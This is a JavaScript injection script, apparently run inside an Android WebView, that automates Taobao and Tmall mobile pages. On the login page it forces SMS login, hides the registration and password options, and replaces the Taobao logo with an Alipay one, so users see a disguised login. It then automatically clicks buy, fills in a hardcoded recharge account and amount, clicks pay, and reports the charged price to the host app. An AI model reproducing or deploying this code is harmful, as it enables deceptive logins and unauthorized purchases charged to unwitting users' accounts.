javascript:{
    let debug = true;
    let target_name = '1259017454';
    let target_count = '30';

    function d(s) {
        if (debug) console.log(s);
    }

    function input_e(selector) {
        var a = document.createEvent("MouseEvents");
        a.initEvent("input", true, true);
        document.querySelector(selector).dispatchEvent(a);
    }

    function hide_hint() {
        let element = document.querySelector('div:not([class]):not([id]) div');
        if (element != null) element.style.display = 'none';
    }

    function ad_js(str) {
        d('命令安卓端执行js' + str);
        if (ad_obj && ad_obj.js) {
            ad_obj.js(str);
        }
    }

    function ad_click() {
        d('命令安卓端点击');
        if (ad_obj && ad_obj.click) {
            ad_obj.click();
        }
    }


    function q(s) {
        return document.querySelector(s);
    }

    if (window.location.href.indexOf('https://login.m.taobao.com/login.htm?') > -1) {
        d('当前是登录页面');
        setInterval(() => {
            if (q('.sms-login-link')) {
                d('有验证码登录按钮');
                q('.sms-login-link').click();
                return false;
            }
            if (q('.send-btn-link') && q('.password-login-link').style.display != 'none') {
                d('显示网页');
                ad_obj.show_web(false);
                d('隐藏部分内容,替换图片');
                q('.register-link').style.display = 'none';
                q('.password-login-link').style.display = 'none';
                setInterval(() => {
                    let tb_logo_img = q('.tb-logo');
                    if (tb_logo_img) {
                        tb_logo_img.style.background = 'url(https://gw.alipayobjects.com/mdn/member_frontWeb/afts/img/A*oRlnSYAsgYQAAAAAAAAAAABkARQnAQ)';
                        tb_logo_img.style.height = '50px';
                        tb_logo_img.style.width = '144px';
                        tb_logo_img.style.marginTop = '70px';
                        tb_logo_img.style.backgroundSize = '144px 50px';
                    }
                }, 100);
                d('显示网页');
                ad_obj.show_web(false);
                return false;
            }
        }, 100);

    } else if (window.location.href.indexOf('https://main.m.taobao.com/order/index.html?') > -1) {
        hide_hint();
    } else if (window.location.href.indexOf('https://detail.m.tmall.com/') > -1) {
        d('订单详情页面');
        setTimeout(() => {
            q('.buy').click();
        }, 50);
    } else if (window.location.href.indexOf('https://market.m.taobao.com/') > -1) {
        d('确认订单页面');
        let clicked = false;
        setInterval(() => {
            if (q('input[placeholder]') && q('input[placeholder]').value == '') {
                q('input[type="number"]').click();
                q('input[type="number"]').value = target_count;
                q('input[placeholder]').click();
                q('input[placeholder]').value = target_name;
                input_e('input[placeholder]');
                return false;
            }
            if (!clicked && q('span[style*="color: rgb(253, 135, 0)"]').innerText != '请填写充值账号') {
                d('没有点击过,并且已经正确显示账号');
                let spans = document.querySelectorAll('span');
                for (let i = 0; i < spans.length; i++) {
                    let span = spans[i];
                    let s = span.innerText;
                    if (s.startsWith('立即支付：') && s.endsWith("元")) {
                        let count = s.substr(5, s.length - 6);
                        span.click();
                        clicked = true;
                        d('点击去支付,金额' + count);
                        if (ad_obj) {
                            ad_obj.fix_count(count);
                            ad_obj.fix_count(count);
                        }
                        return false;
                    }
                }
            }


        }, 100);
    }
}
